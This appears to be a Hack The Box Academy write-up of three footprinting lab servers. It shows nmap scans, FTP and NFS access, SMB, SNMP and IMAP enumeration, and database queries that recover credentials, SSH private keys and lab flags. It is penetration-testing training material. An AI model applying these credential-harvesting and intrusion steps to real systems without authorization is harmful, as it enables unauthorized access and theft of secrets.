# [Footprinting](https://academy.hackthebox.com/module/details/112)

## Skills Assessment - Footprinting

### Footprinting Lab - Easy

> We were commissioned by the company Inlanefreight Ltd to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. 
> The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.
> Additionally, our teammates have found the following credentials `ceil:qwer1234`, and they pointed out that some of the company's employees were talking about SSH keys on a forum.
> The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

Questions:
1. Enumerate the server carefully and find the `flag.txt` file. Submit the contents of this file as the answer. `HTB{7*******************************************************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sS -p- 10.129.42.195 -T5

[SNIP]

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp
```

#### FTP Footprinting 

```
┌──(nabla㉿kali)-[~]
└─$ ftp ftp://ceil:qwer1234@10.129.42.195:2121

[SNIP]

Connected to 10.129.42.195.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
331 Password required for ceil
230 User ceil logged in

ftp> ls -lah
229 Entering Extended Passive Mode (|||57383|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4.0k Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4.0k Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3.7k Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4.0k Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4.0k Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete

ftp> cd .ssh

ftp> ls
229 Entering Extended Passive Mode (|||17057|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete

ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||1485|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |**********************************************************************************************************|  3381        3.46 MiB/s    00:00 ETA
226 Transfer complete
```

```
┌──(nabla㉿kali)-[~]
└─$ chmod 600 id_rsa
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i id_rsa ceil@10.129.42.195

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

[SNIP]

ceil@NIXEASY:~$ cat /home/flag/flag.txt 
HTB{7******************************************************* 📌
```

---

### Footprinting Lab - Medium

> This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.
> Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

Questions:
1. Enumerate the server carefully and find the username `HTB` and its password. Then, submit this user's password as the answer. `lnch7*******************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sS -p- 10.129.97.158 -T5

[SNIP]

PORT      STATE SERVICE
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman

[SNIP]
```

#### NFS Footprinting

```
┌──(nabla㉿kali)-[~]
└─$ showmount -e 10.129.97.158

Export list for 10.129.202.41:
/TechSupport (everyone)
```

```
┌──(nabla㉿kali)-[~]
└─$ mkdir target-nfs && sudo mount -t nfs 10.129.97.158:/ ./target-nfs/ -o nolock
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo tree target-nfs

target-nfs/
└── TechSupport
    ├── ticket4238791283649.txt
    ├── ticket4238791283650.txt
    ├── ticket4238791283651.txt

[SNIP]

    ├── ticket4238791283799.txt
    ├── ticket4238791283800.txt
    └── ticket4238791283801.txt

2 directories, 153 files
```

```
┌──(nabla㉿kali)-[~]
└─$ cat target-nfs/TechSupport/*.txt

Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}

[SNIP]
```

```yaml
credentials:
    username: alex
    password: 'lol123!mD'
    host: 10.129.97.158 (WINMEDIUM)
    port: 445 (SMB)
```

#### SMB Footprinting

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb 10.129.97.158 -u alex -p 'lol123!mD' --shares

[SNIP]

SMB         10.129.97.158   445    WINMEDIUM        [*] Enumerated shares
SMB         10.129.97.158   445    WINMEDIUM        Share           Permissions     Remark
SMB         10.129.97.158   445    WINMEDIUM        -----           -----------     ------
SMB         10.129.97.158   445    WINMEDIUM        ADMIN$                          Remote Admin
SMB         10.129.97.158   445    WINMEDIUM        C$                              Default share
SMB         10.129.97.158   445    WINMEDIUM        devshare        READ,WRITE      
SMB         10.129.97.158   445    WINMEDIUM        IPC$            READ            Remote IPC
SMB         10.129.97.158   445    WINMEDIUM        Users           READ   
```

```
┌──(nabla㉿kali)-[~]
└─$ smbclient --user='alex' --password='lol123!mD' //10.129.97.158/devshare

smb: \> ls
  .                                   D        0  Fri Jul 18 02:26:17 2025
  ..                                  D        0  Fri Jul 18 02:26:17 2025
  important.txt                       A       16  Wed Nov 10 10:12:55 2021

		10328063 blocks of size 4096. 5798685 blocks available
smb: \> get important.txt 
getting file \important.txt of size 16 as important.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

smb: \> !cat important.txt 
sa:87N1ns@slls83
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec rdp 10.129.97.158 -u Administrator -p '87N1ns@slls83'

[SNIP]

RDP         10.129.97.158   3389   WINMEDIUM        [+] WINMEDIUM\Administrator:87N1ns@slls83 (Pwn3d!)
```

```yaml
credentials:
    username: administrator
    password: '87N1ns@slls83'
    host: 10.129.97.158 (WINMEDIUM)
    port: 3389 (RDP)
```

```
┌──(nabla㉿kali)-[~]
└─$ xfreerdp /v:10.129.97.158 /u:administrator /p:'87N1ns@slls83' /dynamic-resolution /drive:shared,~/shared +clipboard
```

#### MSSQL Footprinting

![MSSQL Server Management Studio](./assets/screenshots/footprinting_skills_assessment_01.png)

```sql
SELECT name FROM sys.databases;
USE accounts;
SELECT name FROM sys.tables;
SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='devsacc';
SELECT name,password FROM devsacc WHERE name='HTB';
```

```
lnch7******************* 📌
```

![MSSQL Interaction Queries](./assets/screenshots/footprinting_skills_assessment_02.png)

---

### Footprinting Lab - Hard

> The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

Questions:
1. Enumerate the server carefully and find the username `HTB` and its password. Then, submit HTB's password as the answer. `cr3n4***********************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sS -p- 10.129.202.20 -T5

[SNIP]

PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sSVC -p993,995 10.129.202.20 -T5

[SNIP]

PORT    STATE SERVICE  VERSION
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: IMAP4rev1 more AUTH=PLAINA0001 Pre-login listed capabilities LITERAL+ post-login OK have SASL-IR ID LOGIN-REFERRALS IDLE ENABLE
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) CAPA PIPELINING RESP-CODES AUTH-RESP-CODE TOP USER UIDL
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sU -p- 10.129.202.20 -T5

[SNIP]

PORT    STATE SERVICE
161/udp open  snmp
```

#### SNMP Footprinting

```
┌──(nabla㉿kali)-[~]
└─$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20

10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

```
┌──(nabla㉿kali)-[~]
└─$ snmpwalk -v2c -c backup 10.129.202.20 | tee snmpwalk.output

[SNIP]

iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"

[SNIP]

iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"

[SNIP]
```

#### IMAP Footprinting

```
┌──(nabla㉿kali)-[~]
└─$ curl -k 'imaps://10.129.202.20' --user tom:NMds732Js2761

* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
```

```yaml
credentials:
    username: tom
    password: 'NMds732Js2761'
    host: 10.129.202.20 (NIXHARD)
    port: 993 (IMAPS)
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl s_client -connect 10.129.202.20:imaps

[SNIP]

---
Certificate chain
 0 s:CN = NIXHARD
   i:CN = NIXHARD
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
---

[SNIP]

> 1 LOGIN tom NMds732Js2761

1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

> 1 LIST "" *

* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX

> 1 SELECT "INBOX"

* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.005 + 0.000 + 0.004 secs).

> 1 FETCH 1 ALL

* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
1 OK Fetch completed (0.010 + 0.000 + 0.009 secs).

>1 FETCH 1 BODY[TEXT]

* 1 FETCH (BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd

[SNIP]

vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
)
1 OK Fetch completed (0.001 + 0.000 secs).
```

```
┌──(nabla㉿kali)-[~]
└─$ chmod 600 id_rsa
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i id_rsa tom@10.129.202.20

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

[SNIP]

tom@NIXHARD:~$
```

```yaml
credentials:
    username: tom
    password: 'NMds732Js2761'
    host: 10.129.202.20 (NIXHARD)
    port: 3306 (MySQL)
```

#### Internal Information Gathering

```
tom@NIXHARD:~$ ls -la

total 48
drwxr-xr-x 6 tom  tom  4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Nov 10  2021 .bashrc
drwx------ 2 tom  tom  4096 Nov 10  2021 .cache
drwx------ 3 tom  tom  4096 Nov 10  2021 mail
drwx------ 8 tom  tom  4096 Jul 18 08:27 Maildir
-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
drwx------ 2 tom  tom  4096 Nov 10  2021 .ssh
-rw------- 1 tom  tom  2018 Nov 10  2021 .viminfo

tom@NIXHARD:~$ cat .bash_history 

[SNIP]

mysql -u tom -p 

[SNIP]
```

#### MySQL Footprinting

```
tom@NIXHARD:~$ mysql -u tom -p 

Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

[SNIP]

mysql>
```

```
mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;
Database changed

mysql> SHOW tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+

mysql> DESCRIBE users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+

mysql> SELECT username,password FROM users WHERE username='HTB';
+----------+---------------------------------+
| username | password                        |
+----------+---------------------------------+
| HTB      | cr3n4*********************** 📌 |
+----------+---------------------------------+
```

---
---
